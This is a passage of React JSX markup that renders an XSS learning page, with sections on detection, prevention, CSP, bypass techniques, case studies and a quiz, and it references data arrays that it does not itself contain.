                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.8rem" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} /> Impact Scenarios
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                XSS is a browser-side compromise. It lets an attacker act as the user within your application, often
                without needing to steal credentials directly.
              </Typography>
              <List dense>
                {impactScenarios.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#ef4444" }} />
                    </ListItemIcon>
                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        {/* Detection and Testing */}
        <Grid id="detection" container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SearchIcon sx={{ color: "#3b82f6" }} /> Detection Signals
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                Detection combines user reports, automated monitoring, and code review. Look for places where untrusted
                data reaches HTML or script contexts.
              </Typography>
              <List dense>
                {detectionSignals.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#3b82f6" }} />
                    </ListItemIcon>
                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <TipsAndUpdatesIcon sx={{ color: "#10b981" }} /> Safe Testing Checklist
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                Testing should validate the data flow and the fix. Use a controlled environment and avoid payloads that
                touch real user data or sessions.
              </Typography>
              <List dense>
                {testingChecklist.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                    </ListItemIcon>
                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        {/* Prevention */}
        <Paper id="prevention" sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#10b981", 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#10b981" }} /> Prevention Methods
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Effective prevention layers encoding, safe DOM usage, and strong browser policies. No single control is
            sufficient on its own, so build in defense in depth.
          </Typography>
          <Grid container spacing={1}>
            {preventionMethods.map((m, i) => (
              <Grid item xs={12} sm={6} key={i}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                  <Typography variant="body2">{m}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        <Grid container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <ShieldIcon sx={{ color: "#f59e0b" }} /> CSP Essentials
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                CSP reduces the blast radius by restricting what scripts can execute. Treat it as a safety net for
                mistakes, not a replacement for correct output encoding.
              </Typography>
              <List dense>
                {cspGuidelines.map((item, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                    </ListItemIcon>
                    <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <CodeIcon sx={{ color: "#8b5cf6" }} /> Framework Notes
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                Modern frameworks help, but only if you avoid bypasses and unsafe escape hatches. Review any use of raw
                HTML rendering or template escape overrides.
              </Typography>
              <List dense>
                {frameworkNotes.map((item, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                    </ListItemIcon>
                    <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#f59e0b" }} /> Secure Coding Examples
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Compare unsafe patterns with safer alternatives. The goal is to keep user data as text unless you have a
            strong reason to render HTML.
          </Typography>
          <Grid container spacing={2}>
            {codeSamples.map((sample) => (
              <Grid item xs={12} md={6} key={sample.title}>
                <Box sx={{ mb: 1 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                    {sample.title}
                  </Typography>
                </Box>
                <CodeBlock code={sample.code} language={sample.language} />
              </Grid>
            ))}
          </Grid>
        </Paper>

        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#3b82f6", 0.05) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#3b82f6" }} /> Response Steps
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            When you find XSS, focus on a durable fix. Patch the unsafe rendering, reduce exposure, and add tests so the
            issue does not regress.
          </Typography>
          <Grid container spacing={1}>
            {responseSteps.map((m, i) => (
              <Grid item xs={12} sm={6} key={i}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#3b82f6" }} />
                  <Typography variant="body2">{m}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Tip */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 2,
            bgcolor: alpha("#3b82f6", 0.05),
            border: `1px solid ${alpha("#3b82f6", 0.2)}`,
            display: "flex",
            alignItems: "center",
            gap: 2,
          }}
        >
          <TipsAndUpdatesIcon sx={{ color: "#3b82f6" }} />
          <Typography variant="body2">
            <strong>CSP Tip:</strong> Start with <code>Content-Security-Policy: default-src 'self'</code> and gradually add trusted sources.
          </Typography>
        </Paper>

        {/* Advanced XSS Techniques */}
        <Typography id="advanced" variant="h5" sx={{ fontWeight: 700, mb: 3 }}>🎯 Advanced XSS Techniques</Typography>
        <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
          These patterns show how modern browsers and frameworks can still be tricked when unsafe HTML flows through.
          Study them to understand risk, but test only with explicit authorization.
        </Typography>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {advancedTechniques.map((tech) => (
            <Grid item xs={12} md={6} key={tech.name}>
              <Paper
                sx={{
                  p: 2,
                  height: "100%",
                  borderRadius: 2,
                  border: `1px solid ${alpha("#8b5cf6", 0.2)}`,
                  "&:hover": { borderColor: "#8b5cf6" },
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6" }}>
                    {tech.name}
                  </Typography>
                  <Chip label={tech.difficulty} size="small" sx={{ fontSize: "0.65rem", height: 20, bgcolor: alpha("#8b5cf6", 0.1), color: "#8b5cf6" }} />
                </Box>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                  {tech.description}
                </Typography>
                <Box sx={{ p: 1, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.7rem" }}>
                  {tech.example}
                </Box>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* WAF Bypass Techniques */}
        <Paper id="waf-bypass" sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#f59e0b", 0.03), border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#f59e0b" }} /> WAF Bypass Techniques
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Web Application Firewalls can be bypassed using various encoding and obfuscation techniques. These are for authorized testing only.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Treat WAF rules as an extra barrier, not the primary fix. If output encoding is wrong, a bypass is only a
            matter of time.
          </Typography>
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Technique</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {wafBypassTechniques.map((row) => (
                  <TableRow key={row.technique}>
                    <TableCell sx={{ fontWeight: 600 }}>{row.technique}</TableCell>
                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.example}</TableCell>
                    <TableCell>{row.description}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        </Paper>

        {/* Real-World Case Studies */}
        <Paper id="case-studies" sx={{ p: 3, mb: 4, borderRadius: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#ef4444" }} /> Real-World XSS Case Studies
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            These incidents show how a small rendering bug can create large-scale impact when user-generated content is
            shared or processed by privileged accounts.
          </Typography>
          <Grid container spacing={2}>
            {realWorldCases.map((case_) => (
              <Grid item xs={12} md={6} key={case_.name}>
                <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                  <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{case_.name}</Typography>
                    <Chip label={case_.type} size="small" sx={{ fontSize: "0.6rem", height: 18 }} />
                  </Box>
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                    Platform: {case_.platform}
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 1 }}>{case_.description}</Typography>
                  <Chip label={case_.impact} size="small" color="error" sx={{ fontSize: "0.65rem" }} />
                </Paper>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* CSP Bypass Techniques */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <ShieldIcon sx={{ color: "#3b82f6" }} /> CSP Bypass Techniques
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Even strong CSP policies can sometimes be bypassed through misconfigurations or browser quirks.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            The safest CSP strategy is strict defaults with explicit allowlists, plus automated testing to catch new
            endpoints or libraries that would weaken your policy.
          </Typography>
          <Grid container spacing={2}>
            {cspBypassTechniques.map((bypass) => (
              <Grid item xs={12} md={6} key={bypass.scenario}>
                <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2, height: "100%" }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                    {bypass.scenario}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    {bypass.description}
                  </Typography>
                  <Box sx={{ p: 1, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.7rem" }}>
                    {bypass.example}
                  </Box>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* XSS Testing Tools */}
        <Paper id="tools" sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#22c55e", 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SearchIcon sx={{ color: "#22c55e" }} /> XSS Testing Tools
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Use a mix of proxy tools, scanners, and browser instrumentation. Automated scanners are useful for coverage,
            but manual validation is still needed for DOM-based flows and context-specific encodings.
          </Typography>
          <Grid container spacing={2}>
            {xssTestingTools.map((tool) => (
              <Grid item xs={12} sm={6} md={3} key={tool.name}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
                  <Chip label={tool.category} size="small" sx={{ mt: 0.5, mb: 1, fontSize: "0.6rem" }} color="success" variant="outlined" />
                  <Typography variant="body2" color="text.secondary">{tool.description}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Browser Differences */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
            🌐 Browser-Specific Behaviors
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Browser engines parse HTML differently and enforce CSP with subtle differences. Validate fixes in the
            browsers your users rely on most.
          </Typography>
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Browser</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Behavior</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Notes</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {browserDifferences.map((row) => (
                  <TableRow key={row.browser}>
                    <TableCell sx={{ fontWeight: 600 }}>{row.browser}</TableCell>
                    <TableCell>{row.behavior}</TableCell>
                    <TableCell>{row.notes}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        </Paper>

        {/* Extended Code Samples */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#8b5cf6" }} /> Framework-Specific Examples
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Framework defaults are safer than manual HTML construction, but they still provide escape hatches. The
            examples below highlight common safe and unsafe patterns.
          </Typography>
          <Grid container spacing={2}>
            {extendedCodeSamples.slice(0, 4).map((sample) => (
              <Grid item xs={12} md={6} key={sample.title}>
                <Box sx={{ mb: 1 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                    {sample.title}
                  </Typography>
                </Box>
                <CodeBlock code={sample.code} language={sample.language} />
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Exploit Scenarios Table */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <BugReportIcon sx={{ color: "#ef4444" }} /> Exploit Scenarios by Context
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Use these scenarios to reason about where output encoding should occur. The vulnerable pattern is what to
            look for in code reviews and tests.
          </Typography>
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Context</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Vulnerable Pattern</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Impact</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {exploitScenarios.map((row) => (
                  <TableRow key={row.context}>
                    <TableCell sx={{ fontWeight: 600 }}>{row.context}</TableCell>
                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.vulnerable}</TableCell>
                    <TableCell>{row.impact}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        </Paper>

        {/* Related */}
        <Paper sx={{ p: 3, borderRadius: 3, bgcolor: alpha(theme.palette.primary.main, 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>📚 Related Learning</Typography>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="Command Injection →" clickable onClick={() => navigate("/learn/command-injection")} sx={{ fontWeight: 600 }} />
            <Chip label="SQL Injection →" clickable onClick={() => navigate("/learn/sql-injection")} sx={{ fontWeight: 600 }} />
            <Chip label="OWASP Top 10 →" clickable onClick={() => navigate("/learn/owasp")} sx={{ fontWeight: 600 }} />
          </Box>
        </Paper>
        <Paper
          id="quiz-section"
          sx={{
            mt: 4,
            p: 4,
            borderRadius: 3,
            border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
            Knowledge Check
          </Typography>
          <QuizSection
            questions={quizQuestions}
            accentColor={QUIZ_ACCENT_COLOR}
            title="Cross-Site Scripting Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Paper>

        {/* Bottom Navigation */}
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
          >
            Back to Learning Hub
          </Button>
        </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
